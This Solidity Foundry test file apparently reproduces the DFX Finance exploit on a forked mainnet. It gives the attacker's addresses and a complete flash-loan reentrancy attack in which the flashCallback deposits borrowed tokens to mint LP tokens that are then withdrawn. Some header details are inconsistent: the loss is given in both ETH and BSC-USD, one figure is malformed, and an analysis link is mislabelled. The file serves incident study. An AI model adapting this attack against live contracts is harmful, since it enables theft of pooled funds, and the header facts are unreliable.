// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/StdCheats.sol";
import {ISwapRouter} from './interfaces/IUniswapV3Router.sol';

// @KeyInfo - Total Lost : 3000 ETH or $ ~4M
// Attack Tx: https://etherscan.io/tx/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7
// Attacker Address(EOA): 0x14c19962E4A899F29B3dD9FF52eBFb5e4cb9A067
// Attack Contract Address: 0x6cFa86a352339E766FF1cA119c8C40824f41F22D
// Vulnerable Address: 0x46161158b1947d9149e066d6d31af1283b2d377c
// Total Loss: 36,044,121156865234135946 BSC-USD

// @Analysis
// Blocksec : https://twitter.com/peckshield/status/1590831589004816384



//   分析攻击需要的变量
ICurve constant dfxXidrV2 = ICurve(0x46161158b1947D9149E066d6d31AF1283b2d377C);
ISwapRouter constant UniV3Router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

address constant dfx = 0x46161158b1947D9149E066d6d31AF1283b2d377C;
address constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant xidr = 0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

event log_named_decimal_uint(string name, uint256 balance, uint256 decimal);


contract DFXFinancePoC is Test { // 模拟攻击
    uint256 lpToken;
    
    function setUp() public {
        vm.createSelectFork("mainnet", 15_941_703);

        vm.label(dfx, "DFX");
        vm.label(usdc, "usdc");
        vm.label(xidr, "xidr");
    }
       
    function testExploit() public {
        vm.warp(15_941_703); // block.timestamp = 2022-08-07 23:15:46(UTC)

        console.log("------------------------------- Pre-work -----------------------------");
        console.log("Tx: 0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7");

        console.log("Attacker prepare flashFee");

        // deal(usdc, address(this), 100 ether);
        // deal(xidr, address(this), 100 ether);

        (bool success, ) = WETH.call{value: 1.5 ether}("");

        IERC20(WETH).approve(address(UniV3Router), type(uint256).max);
        IERC20(usdc).approve(address(UniV3Router), type(uint256).max);
        IERC20(usdc).approve(address(dfxXidrV2), type(uint256).max);
        IERC20(xidr).approve(address(UniV3Router), type(uint256).max);
        IERC20(xidr).approve(address(dfxXidrV2), type(uint256).max);

        // WETH to usdc
        tokenToToken(WETH, usdc, IERC20(WETH).balanceOf(address(this)));

        // WETH to xidr
        tokenToToken(usdc, xidr, IERC20(usdc).balanceOf(address(this))/2);

        emit log_named_decimal_uint("[Before] Attacker usdc balance before exploit", IERC20(usdc).balanceOf(address(this)), 6);

        emit log_named_decimal_uint("[Before] Attacker xidr balance before exploit", IERC20(xidr).balanceOf(address(this)), 6);
        
        console.log("-------------------------------- Start Exploit ----------------------------------");

        // 根据palcon来跟踪信息
        uint256[] memory XIDR_USDC = new uint[](2);
        XIDR_USDC[0] = 0;
        XIDR_USDC[1] = 0;
        (, XIDR_USDC) = dfxXidrV2.viewDeposit(200_000 * 1e18);
        console.log("Attacker deposit should xidr Balance", XIDR_USDC[0]);
        console.log("Attacker deposit should usdc Balance", XIDR_USDC[1]);

        IERC20(xidr).approve(address(dfxXidrV2),type(uint256).max);
        IERC20(usdc).approve(address(dfxXidrV2),type(uint256).max);

        dfxXidrV2.flash(address(this), XIDR_USDC[0] * 995 / 1000, XIDR_USDC[1] * 995 / 1000, new bytes(1)); // 5% fee

        dfxXidrV2.withdraw(lpToken, block.timestamp + 60);

        console.log("-------------------------------- End Exploit ----------------------------------");
        emit log_named_decimal_uint("[End] Attacker usdc Balance", IERC20(usdc).balanceOf(address(this)), 6);
        emit log_named_decimal_uint("[End] Attacker xidr Balance", IERC20(xidr).balanceOf(address(this)), 6);
    }

    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        (lpToken,) = dfxXidrV2.deposit(200_000 * 1e18, block.timestamp + 60);

        emit log_named_decimal_uint("Attacker lpToken Balance", IERC20(dfx).balanceOf(address(this)), 0);
    }

    function tokenToToken(address tokenIn, address tokenOut, uint256 amount) internal {
        ISwapRouter.ExactInputSingleParams memory _Params = ISwapRouter.ExactInputSingleParams({
            tokenIn: tokenIn,
            tokenOut: tokenOut,
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: amount,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        UniV3Router.exactInputSingle(_Params);
    }   
}

// 根据palcon来写接口，internal的函数并不会显示
/* -------------------- Interface -------------------- */
interface ICurve {
    function viewDeposit(uint256) view external returns (uint256, uint256[] memory);
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external; 
    function withdraw(uint256 _curvesToBurn, uint256 _deadline) external returns (uint256[] memory withdrawals_);
    function deposit(uint256 _deposit, uint256 _deadline) external returns (uint256, uint256[] memory);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}
